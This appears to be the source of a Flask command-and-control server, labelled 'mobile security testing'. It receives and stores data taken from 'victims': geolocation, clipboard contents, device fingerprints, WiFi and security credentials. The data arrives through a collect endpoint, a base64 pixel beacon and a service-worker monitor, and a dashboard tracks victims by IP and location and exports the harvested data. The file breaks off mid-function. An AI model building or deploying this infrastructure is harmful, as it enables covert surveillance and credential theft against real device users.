#!/usr/bin/env python3
"""
Fixed Advanced Mobile Security C&C Server 
Resolved database storage issues and improved error handling
"""

from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
import json
import sqlite3
import os
from datetime import datetime, timedelta
import base64
import time
import traceback
import io
import csv
from collections import defaultdict, Counter
import zipfile

app = Flask(__name__)
CORS(app)

# Railway configuration
PORT = int(os.environ.get('PORT', 5000))
DATABASE = 'c2_data.db'

def init_db():
    """Initialize SQLite database with simplified but robust schema"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Drop existing tables to recreate with fixed schema
        cursor.execute('DROP TABLE IF EXISTS collected_data')
        cursor.execute('DROP TABLE IF EXISTS victims')
        cursor.execute('DROP TABLE IF EXISTS commands')
        cursor.execute('DROP TABLE IF EXISTS sessions')
        
        # Simplified victims table - focusing on essential fields
        cursor.execute('''
            CREATE TABLE victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE NOT NULL,
                session_id TEXT,
                first_seen TEXT DEFAULT (datetime('now')),
                last_seen TEXT DEFAULT (datetime('now')),
                user_agent TEXT,
                ip_address TEXT,
                attack_type TEXT DEFAULT 'unknown',
                status TEXT DEFAULT 'active',
                location_lat REAL,
                location_lng REAL,
                device_info TEXT,
                permissions_granted TEXT,
                notes TEXT
            )
        ''')
        
        # Simplified data collection table
        cursor.execute('''
            CREATE TABLE collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                data_type TEXT DEFAULT 'unknown',
                data_content TEXT,
                timestamp TEXT DEFAULT (datetime('now')),
                source_url TEXT DEFAULT 'unknown',
                severity TEXT DEFAULT 'medium',
                tags TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
            )
        ''')
        
        # Commands table for remote control
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command_type TEXT,
                command_data TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT (datetime('now')),
                executed_at TEXT
            )
        ''')
        
        # Sessions table for tracking user sessions
        cursor.execute('''
            CREATE TABLE sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                session_start TEXT DEFAULT (datetime('now')),
                session_end TEXT,
                duration INTEGER,
                page_views INTEGER DEFAULT 0,
                actions_performed INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Fixed database initialized successfully")
        return True
        
    except Exception as e:
        log_activity(f"❌ Database initialization failed: {e}")
        traceback.print_exc()
        return False

def log_activity(message, ip_address="server"):
    """Enhanced logging with error handling"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")
    except Exception as e:
        print(f"Logging error: {e}")

def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
    """Fixed victim data storage with better error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Ensure victim_id is provided
        if not victim_id:
            victim_id = f'victim_{int(time.time())}'
        
        # Extract metadata safely
        session_id = ''
        location_lat, location_lng = None, None
        device_info = '{}'
        permissions_granted = '[]'
        
        if isinstance(content, dict):
            session_id = content.get('session_id', '')
            
            # Extract location data safely
            if 'latitude' in content and 'longitude' in content:
                try:
                    location_lat = float(content.get('latitude'))
                    location_lng = float(content.get('longitude'))
                except (ValueError, TypeError):
                    location_lat, location_lng = None, None
            
            # Extract device fingerprint safely
            if data_type == 'device_fingerprint':
                device_info = json.dumps({
                    'platform': content.get('platform', ''),
                    'screen': content.get('screenResolution', ''),
                    'timezone': content.get('timezone', ''),
                    'language': content.get('language', '')
                })
            
            # Track permissions safely
            if 'permission' in content:
                permissions_granted = json.dumps([content.get('permission')])
        
        # Get current timestamp
        current_time = datetime.now().isoformat()
        
        # Insert or update victim - using INSERT OR IGNORE then UPDATE
        cursor.execute('''
            INSERT OR IGNORE INTO victims 
            (victim_id, session_id, first_seen, last_seen, user_agent, ip_address, attack_type, 
             location_lat, location_lng, device_info, permissions_granted)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (victim_id, session_id, current_time, current_time, user_agent, ip_address, attack_type,
              location_lat, location_lng, device_info, permissions_granted))
        
        # Update last_seen and other fields if victim already exists
        cursor.execute('''
            UPDATE victims 
            SET last_seen = ?, user_agent = ?, ip_address = ?, attack_type = ?
            WHERE victim_id = ?
        ''', (current_time, user_agent, ip_address, attack_type, victim_id))
        
        # Determine severity based on data type
        severity = 'low'
        if data_type in ['location_data', 'clipboard_data', 'device_fingerprint']:
            severity = 'high'
        elif data_type in ['permission_granted', 'background_monitor', 'wifi_credentials', 'security_credentials']:
            severity = 'medium'
        
        # Store data point
        content_str = json.dumps(content) if isinstance(content, dict) else str(content)
        cursor.execute('''
            INSERT INTO collected_data 
            (victim_id, data_type, data_content, timestamp, source_url, severity)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (victim_id, data_type, content_str, current_time, source_url, severity))
        
        conn.commit()
        conn.close()
        
        log_activity(f"💾 Stored {data_type} ({severity}) for victim {victim_id[:12]}...", ip_address)
        return True
        
    except Exception as e:
        log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
        traceback.print_exc()
        
        # Try to close connection if still open
        try:
            conn.close()
        except:
            pass
        
        return False

@app.route('/')
def dashboard():
    """Advanced C&C dashboard with full features"""
    dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Advanced Mobile Security C&C Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Consolas', 'Monaco', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            min-height: 100vh;
        }
        
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 250px;
            height: 100vh;
            background: rgba(0, 0, 0, 0.9);
            border-right: 2px solid #00ff41;
            padding: 20px;
            overflow-y: auto;
        }
        
        .main-content {
            margin-left: 250px;
            padding: 20px;
        }
        
        .header { 
            text-align: center; 
            margin-bottom: 30px; 
            padding: 30px;
            background: rgba(0, 255, 65, 0.1);
            border: 2px solid #00ff41;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        
        .header h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff41;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #00ff41; }
            to { text-shadow: 0 0 20px #00ff41, 0 0 30px #00ff41; }
        }
        
        .nav-item {
            display: block;
            color: #00ff41;
            text-decoration: none;
            padding: 12px;
            margin: 5px 0;
            border-radius: 5px;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .nav-item:hover, .nav-item.active {
            background: rgba(0, 255, 65, 0.2);
            border: 1px solid #00ff41;
            transform: translateX(5px);
        }
        
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        
        .stat-box { 
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            padding: 25px; 
            text-align: center;
            border-radius: 15px;
            transition: all 0.3s ease;
        }
        
        .stat-box:hover {
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
            transform: translateY(-5px);
        }
        
        .stat-number { 
            font-size: 2.5rem; 
            color: #ff6b6b;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #ff6b6b;
        }
        
        .stat-label {
            color: #cccccc;
            font-size: 1.1rem;
        }
        
        .content-section {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            display: none;
        }
        
        .content-section.active {
            display: block;
        }
        
        .victims-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px; 
        }
        
        .victims-table th, .victims-table td { 
            border: 1px solid #00ff41; 
            padding: 12px; 
            text-align: left; 
            word-break: break-word;
        }
        
        .victims-table th { 
            background: rgba(0, 255, 65, 0.2);
            font-weight: bold;
        }
        
        .victims-table tr:nth-child(even) {
            background: rgba(0, 255, 65, 0.05);
        }
        
        .status-online { color: #00ff41; font-weight: bold; }
        .status-offline { color: #ff6b6b; }
        .status-away { color: #ffaa00; }
        
        .severity-high { color: #ff6b6b; font-weight: bold; }
        .severity-medium { color: #ffaa00; }
        .severity-low { color: #888; }
        
        button { 
            background: linear-gradient(45deg, #00ff41, #40ff80);
            color: #000; 
            border: none; 
            padding: 8px 15px; 
            cursor: pointer; 
            margin: 2px;
            border-radius: 20px;
            font-weight: bold;
            transition: all 0.3s ease;
            font-size: 12px;
        }
        
        button:hover {
            background: linear-gradient(45deg, #40ff80, #80ff80);
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
        }
        
        .btn-danger:hover {
            background: linear-gradient(45deg, #ff8e8e, #ffaaaa);
        }
        
        .error-message {
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        .success-message {
            background: rgba(0, 255, 65, 0.2);
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        @media (max-width: 768px) {
            .sidebar { 
                transform: translateX(-100%);
                transition: transform 0.3s;
            }
            .sidebar.open { 
                transform: translateX(0);
            }
            .main-content { 
                margin-left: 0;
            }
            .header h1 { font-size: 1.8rem; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .victims-table { font-size: 0.9rem; }
        }
    </style>
</head>
<body>
    <!-- Sidebar Navigation -->
    <div class="sidebar">
        <h3 style="color: #00ff41; margin-bottom: 20px;">🎯 C&C Control</h3>
        <a href="#" class="nav-item active" onclick="showSection('overview')">📊 Overview</a>
        <a href="#" class="nav-item" onclick="showSection('victims')">👥 Victims</a>
        <a href="#" class="nav-item" onclick="showSection('data')">📋 Data Analysis</a>
        <a href="#" class="nav-item" onclick="showSection('export')">💾 Export Data</a>
        <a href="#" class="nav-item" onclick="showSection('settings')">⚙️ Settings</a>
        
        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #00ff41;">
            <button onclick="refreshAllData()" style="width: 100%; margin: 5px 0;">🔄 Refresh All</button>
            <button onclick="clearAllData()" class="btn-danger" style="width: 100%; margin: 5px 0;">🗑️ Clear Data</button>
        </div>
        
        <div style="margin-top: 20px; font-size: 0.8rem; color: #888;">
            <div>📡 Server: <span id="server-status">Online</span></div>
            <div>⏱️ Uptime: <span id="uptime">0h 0m</span></div>
            <div>🔄 Auto-refresh: <span id="auto-refresh-status">ON</span></div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <!-- Overview Section -->
        <div id="overview-section" class="content-section active">
            <div class="header">
                <h1>🎯 Advanced Command & Control Dashboard</h1>
                <p>🌍 Mobile Security Testing C&C Server - Fixed Version</p>
                <p style="margin-top: 10px; color: #ffaa00;">⚡ Powered by Railway - v2.1 Database Fixed</p>
            </div>
            
            <div id="message-container"></div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="total-victims">0</div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="online-victims">0</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="total-data">0</div>
                    <div class="stat-label">Data Points</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="high-severity">0</div>
                    <div class="stat-label">High Severity</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="attack-types">0</div>
                    <div class="stat-label">Attack Types</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="server-uptime">0h</div>
                    <div class="stat-label">Server Uptime</div>
                </div>
            </div>
        </div>

        <!-- Victims Section -->
        <div id="victims-section" class="content-section">
            <h2>👥 Victim Management</h2>
            
            <table class="victims-table">
                <thead>
                    <tr>
                        <th>🆔 Victim ID</th>
                        <th>🎭 Attack Type</th>
                        <th>🌐 IP Address</th>
                        <th>⚡ Status</th>
                        <th>📱 Device</th>
                        <th>📍 Location</th>
                        <th>🛠️ Actions</th>
                    </tr>
                </thead>
                <tbody id="victims-tbody">
                    <tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">
                        🔄 Loading victim data...
                    </td></tr>
                </tbody>
            </table>
        </div>

        <!-- Data Analysis Section -->
        <div id="data-section" class="content-section">
            <h2>📋 Data Analysis</h2>
            <div id="data-analysis-content">
                <div style="text-align: center; padding: 40px; color: #666;">
                    🔄 Loading data analysis...
                </div>
            </div>
        </div>

        <!-- Export Section -->
        <div id="export-section" class="content-section">
            <h2>💾 Data Export & Reports</h2>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
                <button onclick="exportData('victims')">👥 Export Victims (CSV)</button>
                <button onclick="exportData('data')">📋 Export All Data (JSON)</button>
                <button onclick="generateReport()">📄 Generate Report (HTML)</button>
            </div>
            
            <div id="export-status"></div>
        </div>

        <!-- Settings Section -->
        <div id="settings-section" class="content-section">
            <h2>⚙️ System Settings</h2>
            
            <div style="background: rgba(0, 255, 65, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>🔧 Dashboard Settings</h3>
                <label style="display: block; margin: 10px 0;">
                    <input type="checkbox" id="auto-refresh" checked onchange="toggleAutoRefresh()">
                    Enable Auto-refresh (30s)
                </label>
                
                <label style="display: block; margin: 10px 0;">
                    Refresh Interval: 
                    <select id="refresh-interval" onchange="updateRefreshInterval()">
                        <option value="10">10 seconds</option>
                        <option value="30" selected>30 seconds</option>
                        <option value="60">1 minute</option>
                    </select>
                </label>
            </div>
            
            <div style="background: rgba(255, 107, 107, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>🗃️ Database Management</h3>
                <button onclick="testDatabase()" style="margin: 5px;">🧪 Test Database</button>
                <button onclick="clearAllData()" class="btn-danger" style="margin: 5px;">🗑️ Clear All Data</button>
            </div>
        </div>
    </div>

    <script>
        let currentData = {
            victims: [],
            dataPoints: [],
            stats: {}
        };
        
        let autoRefreshEnabled = true;
        let refreshInterval = 30000;
        let refreshTimer;
        
        // Navigation
        function showSection(sectionName) {
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.remove('active');
            });
            
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            
            document.getElementById(sectionName + '-section').classList.add('active');
            event.target.classList.add('active');
            
            loadSectionData(sectionName);
        }
        
        function loadSectionData(section) {
            switch(section) {
                case 'overview':
                case 'victims':
                case 'data':
                    refreshAllData();
                    break;
            }
        }
        
        function showMessage(message, type = 'info') {
            const container = document.getElementById('message-container');
            const className = type === 'error' ? 'error-message' : 'success-message';
            container.innerHTML = `<div class="${className}">${message}</div>`;
            
            setTimeout(() => {
                container.innerHTML = '';
            }, 5000);
        }
        
        async function refreshAllData() {
            try {
                document.getElementById('server-status').textContent = 'Connecting...';
                
                const response = await fetch('/api/dashboard-data');
                if (response.ok) {
                    currentData = await response.json();
                    updateAllDisplays();
                    document.getElementById('server-status').textContent = 'Online';
                    document.getElementById('server-status').style.color = '#00ff41';
                } else {
                    throw new Error(`HTTP ${response.status}`);
                }
            } catch (error) {
                console.error('Error refreshing data:', error);
                document.getElementById('server-status').textContent = 'Error';
                document.getElementById('server-status').style.color = '#ff6b6b';
                showMessage(`Connection error: ${error.message}`, 'error');
            }
        }
        
        function updateAllDisplays() {
            updateStats();
            updateVictimsTable();
            updateDataAnalysis();
        }
        
        function updateStats() {
            const stats = currentData.stats || {};
            document.getElementById('total-victims').textContent = stats.total_victims || 0;
            document.getElementById('online-victims').textContent = stats.online_victims || 0;
            document.getElementById('total-data').textContent = stats.total_data || 0;
            document.getElementById('high-severity').textContent = stats.high_severity || 0;
            document.getElementById('attack-types').textContent = stats.attack_types || 0;
        }
        
        function updateVictimsTable() {
            const tbody = document.getElementById('victims-tbody');
            tbody.innerHTML = '';
            
            if (!currentData.victims || currentData.victims.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">📡 No victims found</td></tr>';
                return;
            }
            
            currentData.victims.forEach(victim => {
                const row = tbody.insertRow();
                const timeSince = Math.floor((Date.now() - new Date(victim.last_seen).getTime()) / 1000);
                
                let status = 'offline';
                let statusText = 'Offline';
                if (timeSince < 120) {
                    status = 'online';
                    statusText = 'Online';
                } else if (timeSince < 600) {
                    status = 'away';
                    statusText = 'Away';
                }
                
                const deviceType = getDeviceType(victim.user_agent || '');
                const shortId = victim.victim_id.substring(0, 20) + '...';
                const location = victim.location_lat ? `${victim.location_lat.toFixed(4)}, ${victim.location_lng.toFixed(4)}` : 'Unknown';
                
                row.innerHTML = `
                    <td title="${victim.victim_id}">${shortId}</td>
                    <td>${victim.attack_type || 'unknown'}</td>
                    <td>${victim.ip_address || 'unknown'}</td>
                    <td class="status-${status}">${statusText} (${formatTime(timeSince)})</td>
                    <td>${deviceType}</td>
                    <td>${location}</td>
                    <td>
                        <button onclick="viewVictim('${victim.victim_id}')" title="View Details">👁️ View</button>
                        <button onclick="deleteVictim('${victim.victim_id}')" class="btn-danger" title="Delete">🗑️</button>
                    </td>
                `;
            });
        }
        
        function updateDataAnalysis() {
            const container = document.getElementById('data-analysis-content');
            
            if (!currentData.dataPoints || currentData.dataPoints.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📋 No data points found</div>';
                return;
            }
            
            let html = '<table class="victims-table"><thead><tr>';
            html += '<th>⏰ Timestamp</th><th>🆔 Victim ID</th><th>📋 Data Type</th>';
            html += '<th>⚠️ Severity</th><th>📍 Source</th></tr></thead><tbody>';
            
            currentData.dataPoints.slice(0, 50).forEach(data => {
                const shortVictimId = data.victim_id.substring(0, 15) + '...';
                const timestamp = new Date(data.timestamp).toLocaleString();
                
                html += `<tr>
                    <td>${timestamp}</td>
                    <td title="${data.victim_id}">${shortVictimId}</td>
                    <td>${data.data_type}</td>
                    <td class="severity-${data.severity}">${data.severity.toUpperCase()}</td>
                    <td>${data.source_url}</td>
                </tr>`;
            });
            
            html += '</tbody></table>';
            container.innerHTML = html;
        }
        
        function getDeviceType(userAgent) {
            if (userAgent.includes('iPhone')) return '📱 iPhone';
            if (userAgent.includes('iPad')) return '📱 iPad';
            if (userAgent.includes('Android')) return '📱 Android';
            if (userAgent.includes('Windows')) return '💻 Windows';
            if (userAgent.includes('Mac')) return '💻 Mac';
            return '❓ Unknown';
        }
        
        function formatTime(seconds) {
            if (seconds < 60) return `${seconds}s`;
            if (seconds < 3600) return `${Math.floor(seconds/60)}m`;
            if (seconds < 86400) return `${Math.floor(seconds/3600)}h`;
            return `${Math.floor(seconds/86400)}d`;
        }
        
        function viewVictim(victimId) {
            window.open(`/victim/${victimId}`, '_blank');
        }
        
        function exportData(type) {
            const url = `/api/export/${type}`;
            window.open(url, '_blank');
            showMessage(`Exporting ${type} data...`, 'info');
        }
        
        async function clearAllData() {
            if (confirm('⚠️ This will delete ALL victim data. Are you sure?')) {
                try {
                    const response = await fetch('/api/clear-data', { method: 'POST' });
                    const result = await response.json();
                    
                    if (response.ok) {
                        showMessage('All data cleared successfully', 'info');
                        refreshAllData();
                    } else {
                        throw new Error(result.error || 'Unknown error');
                    }
                } catch (error) {
                    showMessage(`Failed to clear data: ${error.message}`, 'error');
                }
            }
        }
        
        async function testDatabase() {
            try {
                const response = await fetch('/debug/db');
                const data = await response.json();
                
                if (response.ok) {
                    showMessage(`Database OK: ${data.tables.length} tables, Status: ${data.status}`, 'info');
                } else {
                    throw new Error(data.error || 'Database test failed');
                }
            } catch (error) {
                showMessage(`Database test failed: ${error.message}`, 'error');
            }
        }
        
        function toggleAutoRefresh() {
            autoRefreshEnabled = document.getElementById('auto-refresh').checked;
            document.getElementById('auto-refresh-status').textContent = autoRefreshEnabled ? 'ON' : 'OFF';
            
            if (autoRefreshEnabled) {
                startAutoRefresh();
            } else {
                if (refreshTimer) clearInterval(refreshTimer);
            }
        }
        
        function updateRefreshInterval() {
            refreshInterval = parseInt(document.getElementById('refresh-interval').value) * 1000;
            if (autoRefreshEnabled) {
                startAutoRefresh();
            }
        }
        
        function startAutoRefresh() {
            if (refreshTimer) clearInterval(refreshTimer);
            
            refreshTimer = setInterval(() => {
                if (autoRefreshEnabled) {
                    refreshAllData();
                }
            }, refreshInterval);
        }
        
        // Initialize dashboard
        window.addEventListener('load', function() {
            refreshAllData();
            startAutoRefresh();
            
            // Update uptime display
            const startTime = Date.now();
            setInterval(() => {
                const uptimeSeconds = Math.floor((Date.now() - startTime) / 1000);
                const uptimeHours = Math.floor(uptimeSeconds / 3600);
                const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
                document.getElementById('uptime').textContent = `${uptimeHours}h ${uptimeMinutes}m`;
                document.getElementById('server-uptime').textContent = `${uptimeHours}h ${uptimeMinutes}m`;
            }, 60000);
            
            console.log('🎯 Advanced C&C Dashboard loaded successfully');
        });
    </script>
</body>
</html>
    '''
    return dashboard_html

# Enhanced API endpoints with better error handling
@app.route('/api/dashboard-data')
def api_dashboard_data():
    """Comprehensive dashboard data endpoint with improved error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Test database connection first
        cursor.execute("SELECT 1")
        
        # Get victim statistics with safe fallbacks
        try:
            cursor.execute('SELECT COUNT(*) FROM victims')
            total_victims = cursor.fetchone()[0] or 0
        except Exception as e:
            log_activity(f"Error counting victims: {e}")
            total_victims = 0
        
        try:
            five_minutes_ago = (datetime.now() - timedelta(minutes=5)).isoformat()
            cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
            online_victims = cursor.fetchone()[0] or 0
        except Exception as e:
            log_activity(f"Error counting online victims: {e}")
            online_victims = 0
        
        try:
            cursor.execute('SELECT COUNT(*) FROM collected_data')
            total_data = cursor.fetchone()[0] or 0
        except Exception as e:
            log_activity(f"Error counting data: {e}")
            total_data = 0
        
        try:
            cursor.execute('SELECT COUNT(*) FROM collected_data WHERE severity = "high"')
            high_severity = cursor.fetchone()[0] or 0
        except Exception as e:
            log_activity(f"Error counting high severity: {e}")
            high_severity = 0
        
        try:
            cursor.execute('SELECT COUNT(DISTINCT attack_type) FROM victims')
            attack_types = cursor.fetchone()[0] or 0
        except Exception as e:
            log_activity(f"Error counting attack types: {e}")
            attack_types = 0
        
        # Get victims with safe error handling
        victims = []
        try:
            cursor.execute('''
                SELECT victim_id, attack_type, ip_address, last_seen, user_agent, 
                       status, location_lat, location_lng, first_seen
                FROM victims 
                ORDER BY last_seen DESC 
                LIMIT 100
            ''')
            
            for row in cursor.fetchall():
                victims.append({
                    'victim_id': row[0] or '',
                    'attack_type': row[1] or 'unknown',
                    'ip_address': row[2] or 'unknown',
                    'last_seen': row[3] or '',
                    'user_agent': row[4] or '',
                    'status': row[5] or 'unknown',
                    'location_lat': row[6],
                    'location_lng': row[7],
                    'first_seen': row[8] or ''
                })
        except Exception as e:
            log_activity(f"Error fetching victims: {e}")
            victims = []
        
        # Get recent data points with safe error handling
        data_points = []
        try:
            cursor.execute('''
                SELECT id, victim_id, data_type, data_content, timestamp, 
                       source_url, severity
                FROM collected_data 
                ORDER BY timestamp DESC 
                LIMIT 200
            ''')
            
            for row in cursor.fetchall():
                data_points.append({
                    'id': row[0],
                    'victim_id': row[1] or '',
                    'data_type': row[2] or 'unknown',
                    'data_content': row[3] or '{}',
                    'timestamp': row[4] or '',
                    'source_url': row[5] or 'unknown',
                    'severity': row[6] or 'medium'
                })
        except Exception as e:
            log_activity(f"Error fetching data points: {e}")
            data_points = []
        
        conn.close()
        
        return jsonify({
            'stats': {
                'total_victims': total_victims,
                'online_victims': online_victims,
                'total_data': total_data,
                'high_severity': high_severity,
                'attack_types': attack_types
            },
            'victims': victims,
            'dataPoints': data_points
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_dashboard_data: {e}")
        traceback.print_exc()
        return jsonify({
            'error': str(e),
            'stats': {
                'total_victims': 0,
                'online_victims': 0,
                'total_data': 0,
                'high_severity': 0,
                'attack_types': 0
            },
            'victims': [],
            'dataPoints': []
        }), 500

@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect_data():
    """Main data collection endpoint with improved error handling"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Get data with safe fallbacks
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Extract required fields with safe defaults
        victim_id = data.get('victim_id') or f'victim_{int(time.time())}'
        data_type = data.get('type') or 'unknown'
        source_url = data.get('source_url') or 'unknown'
        attack_type = data.get('attack_type') or 'unknown'
        
        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
        
        # Store data with better error handling
        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
        
        if success:
            return jsonify({
                'status': 'received',
                'timestamp': datetime.now().isoformat(),
                'victim_id': victim_id
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Database storage failed',
                'timestamp': datetime.now().isoformat()
            }), 500
        
    except Exception as e:
        log_activity(f"❌ Error in collect_data: {e}")
        traceback.print_exc()
        return jsonify({
            'error': 'Internal server error',
            'message': str(e),
            'timestamp': datetime.now().isoformat()
        }), 500

@app.route('/api/export/<export_type>')
def api_export(export_type):
    """Export data in various formats with improved error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        
        if export_type == 'victims':
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM victims ORDER BY last_seen DESC')
            data = cursor.fetchall()
            
            # Create CSV
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Victim ID', 'Session ID', 'First Seen', 'Last Seen', 
                           'User Agent', 'IP Address', 'Attack Type', 'Status', 
                           'Location Lat', 'Location Lng'])
            writer.writerows(data)
            
            response = app.response_class(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': 'attachment; filename=victims.csv'}
            )
            conn.close()
            return response
            
        elif export_type == 'data':
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
            data = cursor.fetchall()
            
            # Convert to JSON format
            json_data = []
            for row in data:
                json_data.append({
                    'id': row[0],
                    'victim_id': row[1],
                    'data_type': row[2],
                    'data_content': row[3],
                    'timestamp': row[4],
                    'source_url': row[5],
                    'severity': row[6]
                })
            
            response = app.response_class(
                json.dumps(json_data, indent=2),
                mimetype='application/json',
                headers={'Content-Disposition': 'attachment; filename=collected_data.json'}
            )
            conn.close()
            return response
            
        else:
            return jsonify({'error': 'Invalid export type'}), 400
            
    except Exception as e:
        log_activity(f"❌ Error in api_export: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/clear-data', methods=['POST'])
def api_clear_data():
    """Clear all data from database with improved error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM collected_data')
        cursor.execute('DELETE FROM victims')
        cursor.execute('DELETE FROM commands')
        cursor.execute('DELETE FROM sessions')
        
        conn.commit()
        conn.close()
        
        log_activity("🗑️ All data cleared from database")
        
        return jsonify({'status': 'success', 'message': 'All data cleared'})
        
    except Exception as e:
        log_activity(f"❌ Error in api_clear_data: {e}")
        return jsonify({'error': str(e)}), 500

# Keep existing endpoints for backward compatibility
@app.route('/monitor', methods=['POST', 'OPTIONS'])
def monitor_endpoint():
    """Background monitoring endpoint"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id') or f'monitor_{ip_address}_{int(time.time())}'
        
        log_activity(f"📡 MONITOR: Background data from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'background_monitor', data, 'service_worker', ip_address, user_agent, 'background')
        
        return jsonify({'status': 'monitored'})
        
    except Exception as e:
        log_activity(f"❌ Error in monitor_endpoint: {e}")
        return jsonify({'error': 'failed'}), 500

@app.route('/pixel.gif')
def pixel_beacon():
    """Image beacon endpoint"""
    try:
        encoded_data = request.args.get('d', '')
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        if encoded_data:
            try:
                decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                data = json.loads(decoded_data)
                victim_id = data.get('victim_id', f'pixel_{ip_address}')
                
                log_activity(f"🖼️ PIXEL: Image beacon from {victim_id[:12]}...", ip_address)
                store_victim_data(victim_id, 'pixel_beacon', data, 'image_beacon', ip_address, 'Image Beacon', 'pixel')
                
            except Exception as e:
                log_activity(f"❌ Error decoding pixel data: {e}")
        
        # Return 1x1 transparent GIF
        pixel_data = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
        return pixel_data, 200, {'Content-Type': 'image/gif'}
        
    except Exception as e:
        log_activity(f"❌ Error in pixel_beacon: {e}")
        return '', 500

@app.route('/beacon', methods=['POST'])
def beacon_endpoint():
    """Navigator.sendBeacon endpoint"""
    try:
